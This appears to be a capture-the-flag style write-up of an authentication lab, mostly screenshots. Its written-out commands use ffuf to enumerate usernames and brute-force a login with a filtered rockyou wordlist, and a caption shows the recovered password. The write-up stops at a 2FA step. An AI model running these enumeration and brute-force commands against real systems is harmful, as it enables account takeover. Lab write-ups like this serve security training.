# 🚘 Skills Assessment

First i create an account:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Then i connect to admin panel:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

I created 2 accounts, felix and felix1 to look at some differences:

and i saw the following:

cookie of felix: PHPSESSID=oskfiuf01785f4f9ba735e0c3p

\---------- felix1: PHPSESSID=oskfiuf01785f4f9ba735e0c3p

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ok after a bit of messing arounf i find the path

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.63.227:35458/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=test" -fr "Unknown username"
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we found user gladys

now let's create a custom wordlist according to password policy:

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '{12}' > custom_wordlist.txt
```

Now we bruteforce:

```
ffuf -w custom_wordlist.txt -u http://94.237.63.227:35458/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Unknown username"
```

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption><p>dWinaldasD13</p></figcaption></figure>

Now with the creds, let's connect, we can see 2FA:

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1360).png" alt=""><figcaption></figcaption></figure>
